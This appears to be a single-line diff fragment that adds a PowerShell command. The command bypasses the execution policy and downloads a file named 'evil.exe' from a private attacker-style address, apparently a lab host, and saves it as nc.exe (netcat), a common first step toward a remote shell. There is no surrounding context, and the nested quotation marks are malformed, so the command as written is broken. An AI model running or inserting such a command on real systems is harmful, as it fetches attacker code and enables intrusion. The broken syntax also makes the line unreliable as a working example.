@@ -1,0 +1,1 @@
+powershell -exec bypass -c "Invoke-WebRequest -Uri "http://10.10.14.89/evil.exe -OutFile nc.exe"
